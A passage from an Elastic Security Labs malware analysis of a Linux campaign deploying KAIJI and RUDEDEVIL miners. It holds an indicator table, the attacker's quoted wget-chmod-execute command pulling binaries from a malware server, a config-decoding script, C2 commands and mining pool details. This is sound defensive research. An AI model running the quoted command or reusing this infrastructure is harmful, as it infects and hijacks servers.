1</td></tr><tr><td>47ceca049bfcb894c9a229e7234e8146d8aeda6edd1629bc4822ab826b5b9a40</td><td>SHA-256</td><td>l86_v2</td><td>RUDEDEVIL/LUFICER x86 version 2</td></tr><tr><td>e89f4073490e48aa03ec0256d0bfa6cf9c9ac6feb271a23cb6bc571170d1bcb5</td><td>SHA-256</td><td>l86_v3</td><td>RUDEDEVIL/LUFICER x86 version 3</td></tr><tr><td>d6350d8a664b3585108ee2b6f04f031d478e97a53962786b18e4780a3ca3da60</td><td>SHA-256</td><td>hjvhg.exe</td><td>Miner</td></tr><tr><td>54a5c82e4c68c399f56f0af6bde9fb797122239f0ebb8bcdb302e7c4fb02e1de</td><td>SHA-256</td><td>mvhhvcp3.exe</td><td>DONUT LOADER</td></tr><tr><td>9e32be17b25d3a6c00ebbfd03114a0947361b4eaf4b0e9d6349cbb95350bf976</td><td>SHA-256</td><td>vdfgb.exe</td><td>Miner</td></tr><tr><td><a href="http://gcp.pagaelrescate%5B.%5Dcom:8080/ifindyou">http://gcp.pagaelrescate[.]com:8080/ifindyou</a></td><td>url</td><td>ifindyou.sh</td><td>Stage 1</td></tr><tr><td><a href="http://gcp.pagaelrescate%5B.%5Dcom:8080/cycnet">http://gcp.pagaelrescate[.]com:8080/cycnet</a></td><td>url</td><td>cycnet.sh</td><td>Stage 2</td></tr><tr><td><a href="http://gcp.pagaelrescate%5B.%5Dcom:8080/testslot/enviador_slot">http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot</a></td><td>url</td><td>Enviador_slot.py</td><td>Stage 3</td></tr><tr><td><a href="http://gcp.pagaelrescate%5B.%5Dcom:8080/t9r/SystemdXC">http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC</a></td><td>url</td><td>SystemdXC</td><td>XMRIG</td></tr><tr><td><a href="http://38.54.125%5B.%5D192:8080/nginx-rc">http://38.54.125[.]192:8080/nginx-rc</a></td><td>url</td><td>nginx-rc</td><td>LIGOLO-NG</td></tr><tr><td><a href="http://62.72.22%5B.%5D91/apache2">http://62.72.22[.]91/apache2</a></td><td>url</td><td>apache2</td><td>Custom Malware</td></tr><tr><td><a href="http://62.72.22%5B.%5D91/apache2v86">http://62.72.22[.]91/apache2v86</a></td><td>url</td><td>apache2v86</td><td>Custom Malware</td></tr><tr><td><a href="http://91.92.241%5B.%5D103:8002/gk.php">http://91.92.241[.]103:8002/gk.php</a></td><td>url</td><td>gk.php</td><td>PHP Backdoor</td></tr><tr><td><a href="http://hfs.t1linux%5B.%5Dcom:7845/scdsshfk">http://hfs.t1linux[.]com:7845/scdsshfk</a></td><td>url</td><td>scdsshfk</td><td>XMRIG</td></tr><tr><td>gcp.pagaelrescate[.]com</td><td>domain-name</td><td></td><td>REF Hosting domain</td></tr><tr><td>nishabii[.]xyz</td><td>domain-name</td><td></td><td>RUDEDEVIL C2</td></tr><tr><td>3.147.53[.]183</td><td>ipv4-addr</td><td></td><td>Python Reverse Shell C2</td></tr><tr><td>38.54.125[.]192</td><td>ipv4-addr</td><td></td><td>C2 Server</td></tr><tr><td>107.178.101[.]245</td><td>ipv4-addr</td><td></td><td>Malware File Server (Rejetto)</td></tr><tr><td>62.72.22[.]91</td><td>ipv4-addr</td><td></td><td>Server Hosting Malware</td></tr><tr><td>91.92.241[.]103</td><td>ipv4-addr</td><td></td><td>C2 Server</td></tr><tr><td>61.160.194[.]160</td><td>ipv4-addr</td><td></td><td>Server Hosting Malware</td></tr><tr><td>41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL</td><td>XMR Wallet</td><td></td><td>RUDEDEVIL/LUFICER mining wallet</td></tr><tr><td>42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc</td><td>XMR Wallet</td><td></td><td>RUDEDEVIL/LUFICER mining wallet</td></tr><tr><td>1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz</td><td>BTC Wallet</td><td></td><td>XMRIG mining wallet</td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="references" class="absolute -top-32"></span>References</h2>
<p>The following were referenced throughout the above research:</p>
<ul>
<li><a href="https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html">https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html</a></li>
<li><a href="https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/">https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities">https://www.fortinet.com/blog/threat-research/multiple-threats-target-adobe-coldfusion-vulnerabilities</a></li>
<li><a href="https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/">https://www.aquasec.com/blog/lucifer-ddos-botnet-malware-is-targeting-apache-big-data-stack/</a></li>
<li><a href="https://github.com/hackerschoice/gsocket">https://github.com/hackerschoice/gsocket</a></li>
</ul></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/betting-on-bots#introduction"><span>Introduction</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/betting-on-bots#execution-flow"><span>Execution&nbsp;flow</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/betting-on-bots#initial-access"><span>Initial&nbsp;access</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/betting-on-bots#fileserver"><span>Fileserver</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/betting-on-bots#rudedevillucifer"><span>RUDEDEVIL/LUCIFER</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/betting-on-bots#thread-management-in-the-malware"><span>Thread Management in the&nbsp;Malware</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/betting-on-bots#understanding-the-killpid-function"><span>Understanding the KillPid&nbsp;Function</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/betting-on-bots#understanding-the-get_net_messages-function"><span>Understanding the Get_Net_Messages&nbsp;Function</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/betting-on-bots#understanding-the-get_cpu_message-function"><span>Understanding the Get_Cpu_Message&nbsp;Function</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/betting-on-bots#understanding-the-send_host_message-function"><span>Understanding the Send_Host_Message&nbsp;Function</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse&amp;url=https://www.elastic.co/security-labs/betting-on-bots" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/betting-on-bots" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/betting-on-bots&amp;title=Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/betting-on-bots&amp;title=Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Betting on Bots: Investigating Linux malware, crypto mining, and gambling API abuse","slug":"betting-on-bots","date":"2024-09-27","description":"The REF6138 campaign involved cryptomining, DDoS attacks, and potential money laundering via gambling APIs, highlighting the attackers' use of evolving malware and stealthy communication channels.","image":"betting-on-bots.jpg","tags":["linux","kaiji","rudedevil","gsocket","cryptomining"],"body":{"raw":"\n## Introduction\n\nIn recent months, Elastic Security Labs has uncovered a sophisticated Linux malware campaign targeting vulnerable servers. The attackers initiated the compromise in March 2024 by exploiting an Apache2 web server. Gaining initial access the threat actors deployed a complex intrusion set to establish persistence and expand their control over the compromised host.\n\nThe threat actors utilized a mixture of tools and malware, including C2 channels disguised as kernel processes, telegram bots for communication, and cron jobs for scheduled task execution. Notably, they deployed multiple malware families, such as KAIJI and RUDEDEVIL, alongside custom-written malware. KAIJI, known for its DDoS capabilities, and RUDEDEVIL, a cryptocurrency miner, were used to exploit system resources for malicious purposes.\n\nOur investigation revealed a potential Bitcoin/XMR mining scheme that leverages gambling APIs, suggesting the attackers might be conducting money laundering activities using compromised hosts. We also gained access to a file share that hosted daily uploads of fresh KAIJI samples with previously unseen hashes, indicating active development and adaptation by the malware authors.\n\nThis research publication delves into the details of the campaign, providing a comprehensive analysis of the attackers' tactics, techniques, and procedures. We explore how they established initial access, the methods used for persistence and privilege escalation, and the malware deployed at each stage. Additionally, we discuss the command and control infrastructure, including the use of GSOCKET and Telegram for stealthy communication.\n\n## Execution flow\n\n### Initial access\n\nOur team observed a host that was initially compromised in March 2024 by obtaining arbitrary code execution on a server running Apache2. Evidence of this compromise is seen in the execution of the `id` command via the Apache2 process, after which we see the threat actor exploiting the web server and deploying KAIJI malware under the `www-data` user account.\n\nShortly after the Kaiji deployment, the attacker used the `www-data` account to download a script named `00.sh` from the URL `http://61.160.194[.]160:35130`, which, after further investigation, also hosted several versions of RUDEDEVIL malware.\n\n`00.sh` is a stager that:\n\n* Sets its default shell and PATH.\n* Deletes several log files to erase traces of execution.\n* Leverages `ps`, `netstat`, `lsof` and a list of common mining process names to kill any potential mining competition on the compromised host.\n* Flushes the `iptables` rules on the host, sets several `iptables` rules to block connections to specific destination ports and mining pools, and disables `iptables`.\n* Finally, a second stage (`sss6`/`sss68`) is downloaded and executed, and execution traces are erased.\n\nThe figure below shows a compressed version of the stager. Lines annotated with `[...]` are shortened to enhance readability. \n\n![Compressed version of the 00.sh stager](/assets/images/betting-on-bots/image5.png \"Compressed version of the 00.sh stager\")\n\n### Fileserver\n\nVia the backdoored web server process, the attacker downloaded and executed malware through the following command:\n\n```\nsh -c wget http://107.178.101[.]245:5488/l64;chmod 777 l64;./l64;rm -r l64;wget http://107.178.101[.]245:5488/l86;chmod 777 l86;./l86;rm -r l86\n```\n\nThe `l64` and `l86` files are downloaded from `http://107.178.101[.]245:5488`, after which they are granted all permissions, executed, and removed. Looking at the server that is hosting these malware samples, we see the following:\n\n![Rejetto File Server Hosting Several Pieces of Malware](/assets/images/betting-on-bots/image30.png \"Rejetto File Server Hosting Several Pieces of Malware\")\n\nThis seems to be a file server, hosting several types of malware for different architectures. The file server leverages the Rejetto technology. These malwares have upload dates and download counters. For example, the `download.sh` file that was uploaded September 10th, was already downloaded 3,100 times. \n\n![Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload](/assets/images/betting-on-bots/image25.png \"Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload\")\n\n### RUDEDEVIL/LUCIFER\n\nUpon closer inspection, the file `sss6`, which was downloaded and executed, has been identified as the RUDEDEVIL malware. Early in the execution process, we encounter an embedded message characteristic of this malware family:\n\n![RUDEDEVIL Malware Characteristic](/assets/images/betting-on-bots/image11.png \"RUDEDEVIL Malware Characteristic\")\n\n```\nHi, man. I\\'ve seen several organizations report my Trojan recently, \nPlease let me go. I want to buy a car. That\\'s all. I don\\'t want to hurt others. \nI can\\'t help it. My family is very poor. In China, it\\'s hard to buy a suite. \nI don\\'t have any accommodation. I don\\'t want to do anything illegal. \nReally, really, interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh6v5kevp7xzngklnutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, \nthank yo\n```\n\nWe note that the files `l64` and `l86` that are hosted on the file server contain the same malware. When analyzing the execution flow of the malware we see that the main function of the malware performs several key tasks:\n\n* **Daemon Initialization:** The process is converted into a daemon using `daemon(1, 0)`.\n* **Socket Creation:** A socket is created and bound to a specific port.\n* **Signal Handling:** Custom signal handlers are set up for various signals.\n* **Service Initialization:** Several services are started using `SetFILE`.\n* **Privilege Handling:** It checks for root privileges and adjusts resource limits accordingly.\n* **Decryption:** The malware decrypts its configuration blobs.\n* **Thread Creation:** Multiple threads are spawned for tasks like mining, killing processes, and monitoring network and CPU usage.\n* **Main Loop:** The program enters an infinite loop where it repeatedly connects to a server and sleeps for a specified duration.\n\nWhen examining the encryption routine, we find it utilizes XOR-based encoding:\n\n![DareDevil Encryption Routine](/assets/images/betting-on-bots/image13.png \"DareDevil Encryption Routine\")\n\nTo decode the contents statically, we developed a basic Python snippet:\n\n``` python\ndef DecryptData(data_block, encryption_key):\n   key_modifier = encryption_key \u0026 0xFF\n   key_index = key_modifier // 0x5F  # 0x5F = 95 in decimal\n   modifier = (key_modifier - (key_index * 0x5F)) + 0x58  # 0x58 = 88 in decimal\n\n   for i in range(len(data_block)):\n       data_block[i] ^= modifier\n       data_block[i] \u0026= 0xFF  # Ensure 8-bit value\n       data_block[i] += modifier\n       data_block[i] \u0026= 0xFF  # Ensure 8-bit value\n\n   return data_block\n\n# Encoded data as hex strings\nencoded_data = [\n   '4c494356515049490c467978',\n   '0d4f1e4342405142454d0b42534e380f0f5145424f0c53034e4f4f4a0c4f40573801393939391e0d451e020141303727222026254f252d372643400706314955032a593330233237587951215553552d464c0101414939514401515258414324273340254756564741404207004122782d50475555412d503106394d4c34554e48513926352054362a1e0d4e1e20',\n   '0f424d4e0f435536575649484b',\n   '5642424e380f0f5654430c42014a494c45460c534f4d38070602050f435352434356544b',\n]\n\nencryption_key = 0x03FF  # 1023 in decimal\n\n# Process and decrypt each encoded data string\nfor data in encoded_data:\n   # Convert hex string to list of integers\n   data_bytes = bytes.fromhex(data)\n   data_block = list(data_bytes)\n\n   # Decrypt the data\n   decrypted_block = DecryptData(data_block, encryption_key)\n\n   # Convert decrypted data back to bytes\n   decrypted_bytes = bytes(decrypted_block)\n   print(\"Decrypted text:\", decrypted_bytes.decode('utf-8', errors='ignore'))\n```\n\nAfter decoding the configuration, the following values are revealed:\n\n* The first value C2 domain `nishabii[.]xyz`.\n* The second value reveals options that will be passed to XMRIG.\n* The third value shows the temp file location the malware uses.\n* The fourth and last string shows the download location for the XMRIG binary.\n\n### Thread Management in the Malware\n\nThe malware initiates several threads to handle its core operations. Let’s explore how some of these functions work in detail.\n\n#### Understanding the KillPid Function\n\nOne of the threads runs the KillPid function, which is designed to continuously monitor and manage processes. The function begins by detaching its current thread, allowing it to run in the background without blocking other processes. It then enters an infinite loop, repeatedly executing its tasks.\n\nAt the heart of its functionality is an array called `sb_name`, which contains the names of processes the malware wants to terminate. \n\n![RUDEDEVIL kill process array](/assets/images/betting-on-bots/image24.png \"RUDEDEVIL kill process array\")\n\nEvery two seconds, the function checks the system for processes listed in this array, retrieving their process IDs (PIDs) using a helper function called `getPidByName`. After each iteration, it moves to the next process in the list, ensuring all processes in `sb_name` are handled.\n\nInterestingly, after processing all elements in the array, the function enters an extended sleep for 600 seconds — roughly 10 minutes — before resuming its process checks. This extended sleep period is likely implemented to conserve system resources, ensuring the malware doesn't consume too much CPU time while monitoring processes.\n\n#### Understanding the Get_Net_Messages Function\n\nAnother crucial thread is responsible for monitoring network traffic, specifically focusing on the `eth0` network interface. This functionality is handled by the `getOutRates` function. The function begins by setting up necessary variables and opening the `/proc/net/dev` file, which contains detailed network statistics for each interface.\n\n![Getting network rates from /proc/net/dev](/assets/images/betting-on-bots/image22.png \"Getting network rates from /proc/net/dev\")\n\nIf the file is successfully opened, the malware reads a block of data — up to 1024 bytes — and processes it to extract the relevant network statistics. It specifically looks for the `eth0` interface, parsing the output rate data using a standard string parsing method. If successful, the function returns the output rate for `eth0`; otherwise, it returns `0`, ensuring the malware continues functioning even if an error occurs.\n\nThis routine allows the malware to quietly monitor the network activity of the infected machine, likely to track data being sent or received across the interface.\n\n#### Understanding the Get_Cpu_Message Function\n\nFor CPU monitoring, the malware uses the `GetCpuRates` function. This function continuously monitors the CPU usage by reading data from `/proc/stat`. Similar to how the network data is handled, the CPU statistics are read and parsed, allowing the malware to calculate the system's CPU usage.\n\n![Getting CPU information from /proc/stat](/assets/images/betting-on-bots/image34.png \"Getting CPU information from /proc/stat\")\n\nThe function operates in an infinite loop, sleeping for one second between each iteration to avoid overwhelming the system. If the file cannot be opened for some reason, the function logs an error and gracefully exits. However, as long as it’s able to read the file, it continually monitors CPU usage, ensuring the malware remains aware of system performance.\n\n#### Understanding the Send_Host_Message Function\n\nPerhaps the most critical thread is the one responsible for sending system information back to the malware operators. The `_SendInfo` function performs this task by collecting data about the infected system’s CPU and network usage. It begins by setting up buffers and preparing file paths to gather the necessary data. Depending on the system’s status, it formats the CPU and network usage into a string.\n\n![Sending system info back to the C2](/assets/images/betting-on-bots/image19.png \"Sending system info back to the C2\")\n\nAdditionally, the function checks whether a particular process is running on the system and adjusts its formatted message accordingly. Finally, it sends this formatted data back to the command-and-control server via a socket connection.\n\nIn essence, this function allows the malware to remotely monitor the infected machine, gathering key details like CPU load and network activity. The operators can use this information to assess the status of their infection and adjust their activities as needed.\n\n### Connecting to the Command-and-Control (C2) Server\n\nOnce all the threads are up and running, the malware shifts its focus to establishing a connection with its C2 server. This is managed by the `ConnectServer` function in the main thread, which handles communication with the server and executes commands remotely.\n\n#### Understanding the ConnectServer Function\n\nThe first task the `ConnectServer` function performs is establishing a connection to the C2 server using `ServerConnectCli`. After successfully connecting, the malware configures the socket to enable keep-alive settings, ensuring that the connection remains stable over extended periods of time.\n\nOnce the connection is set up, the malware collects various pieces of system information, including the hostname, user information, CPU specs, and memory details. This information is then sent to the server as an initial data payload, providing the attackers with a detailed view of the infected machine.\n\nAfter this initial setup, the malware enters an ongoing loop where it awaits and processes commands from the server. The types of commands handled are varied and can include tasks like launching a DDoS attack, stopping or starting CPU-intensive operations, executing system commands, or managing cryptocurrency mining activities. The loop continues indefinitely, ensuring that the malware is ready to execute any command sent by its operators.\n\nWhen the connection is no longer needed, or when the malware receives a termination command, it gracefully closes the socket, ending the session with the server.\n\n#### Command-and-Control (C2) Commands\n\nThe `ConnectServer` function processes a variety of commands from the C2 server, each designed to control a different aspect of the infected system. Here’s a breakdown of the commands handled by the malware:\n\n* **Case 4:** The malware calls the `DealwithDDoS` function, likely initiating a Distributed Denial of Service (DDoS) attack.\n* **Case 5:** Sets the `StopFlag` to `1`, which could signal the malware to stop specific tasks.\n* **Case 6:** Downloads a file from the server using `http_get`, changes its permissions, and then executes it. This command allows the attackers to run additional malware or scripts on the infected machine.\n* **Case 7:** Executes a system command using the `system` function, providing the attackers with direct control over the system’s command line.\n* **Case 8:** Sets `StopCpu` to `0`, restarting any previously halted CPU tasks.\n* **Case 9:** Sets `StopCpu` to `1`, halting all CPU tasks.\n* **Case 0xA:** Updates the CPU mining configuration with new data and retrieves the PID of the current process, allowing the malware to modify its cryptocurrency mining operations.\n* **Case 0xB:** Sets `stopxmr` to `1`, effectively stopping the XMRIG miner.\n* **Case 0xC:** Resets `stopxmr` to `0` and retrieves the current process PID, resuming the mining activity.\n\n![Processing of C2 commands](/assets/images/betting-on-bots/image19.png \"Processing of C2 commands\")\n\nEach command gives the malware operators precise control over how the infected machine behaves, whether it’s participating in a DDoS attack, running new malware, or managing mining operations.\n\n### Variants of RUDEDEVIL Malware and XMRIG Configuration\n\nWhile the file server mentioned before was active, we observed multiple versions of the RUDEDEVIL malware being uploaded. The core functionality of these versions remained largely the same, with the only significant variation being the embedded XMRIG commands used for cryptocurrency mining.\n\nEach version of the malware was configured to connect to the same mining pool, `c3pool.org`, but with slight differences in the parameters passed to the XMRIG miner:\n\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 